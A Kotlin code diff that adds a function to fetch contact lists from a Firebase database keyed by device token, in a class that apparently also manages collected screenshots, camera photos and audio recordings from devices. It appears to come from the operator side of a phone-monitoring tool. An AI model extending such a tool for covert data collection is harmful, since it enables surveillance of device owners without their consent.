@@ -678,6 +678,54 @@ class FirebaseAdminConnector {
         }
     }
 
+    // Fetch contacts from contacts/$token
+    suspend fun getContacts(deviceToken: String): List<Contact> = withContext(Dispatchers.IO) {
+        val request = Request.Builder()
+            .url("$rootUrl/contacts/$deviceToken.json")
+            .get()
+            .build()
+        try {
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) return@withContext emptyList()
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
+
+                val contacts = mutableListOf<Contact>()
+                if (bodyStr.trim().startsWith("[")) {
+                    val arr = JSONArray(bodyStr)
+                    for (i in 0 until arr.length()) {
+                        val obj = arr.optJSONObject(i) ?: continue
+                        contacts.add(
+                            Contact(
+                                id = i.toString(),
+                                name = obj.optString("name", "Unknown"),
+                                number = obj.optString("number", "")
+                            )
+                        )
+                    }
+                } else {
+                    val json = JSONObject(bodyStr)
+                    val keys = json.keys()
+                    while (keys.hasNext()) {
+                        val key = keys.next()
+                        val obj = json.optJSONObject(key) ?: continue
+                        contacts.add(
+                            Contact(
+                                id = key,
+                                name = obj.optString("name", "Unknown"),
+                                number = obj.optString("number", "")
+                            )
+                        )
+                    }
+                }
+                return@withContext contacts.sortedBy { it.name.lowercase() }
+            }
+        } catch (e: Exception) {
+            Log.e("FirebaseConnector", "Error fetching contacts list", e)
+            return@withContext emptyList()
+        }
+    }
+
     // Delete a specific media item from Firebase
     suspend fun deleteMediaItem(deviceToken: String, category: String, itemId: String): Boolean = withContext(Dispatchers.IO) {
         // category should be "screenshots", "camera_photos", or "audio_records"
